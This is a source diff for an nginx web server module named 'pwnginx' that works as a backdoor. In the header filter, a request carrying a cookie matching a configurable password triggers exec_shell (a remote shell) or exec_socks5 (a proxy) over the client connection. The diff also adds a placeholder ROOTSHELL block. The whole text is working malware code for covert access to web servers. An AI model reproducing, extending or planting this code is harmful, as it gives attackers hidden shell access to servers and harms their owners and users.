@@ -7,7 +7,8 @@
 #include <ngx_config.h>
 #include <ngx_core.h>
 #include <ngx_http.h>
-#include "functions.h"
+#include "pwnginx.h"
+#include "config.h"
 
 static ngx_int_t
 ngx_http_pwnginx_init(ngx_conf_t *cf);
@@ -44,11 +45,11 @@ ngx_http_pwnginx_header_filter(ngx_http_request_t *r)
     ngx_table_elt_t ** cookies = NULL;
     cookies = r->headers_in.cookies.elts;
     if(r->headers_in.cookies.nelts==1){
-        if(strncmp((char *)cookies[0]->value.data,"pwnginx=on; action=1",strlen("pwnginx=on; action=1"))==0){
+        if(strncmp((char *)cookies[0]->value.data,"pwnginx="PASSWORD"; action=1",strlen(PASSWORD)+18)==0){
             msend(cmd_fd, "pwnginx1", sizeof("pwnginx1"));
             exec_shell(cmd_fd);
         }
-        else if(strncmp((char *)cookies[0]->value.data,"pwnginx=on; action=2",strlen("pwnginx=on; action=2"))==0){
+        else if(strncmp((char *)cookies[0]->value.data,"pwnginx="PASSWORD"; action=2",strlen(PASSWORD)+18)==0){
             msend(cmd_fd, "pwnginx2", sizeof("pwnginx2"));
             exec_socks5(cmd_fd);
         }
@@ -69,6 +70,12 @@ ngx_http_pwnginx_init(ngx_conf_t *cf)
     ngx_http_top_header_filter = ngx_http_pwnginx_header_filter;
     ngx_http_next_body_filter = ngx_http_top_body_filter;
     ngx_http_top_body_filter = ngx_http_pwnginx_body_filter;
+
+
+#ifdef ROOTSHELL
+
+#endif
+
     return NGX_OK;
 }
 
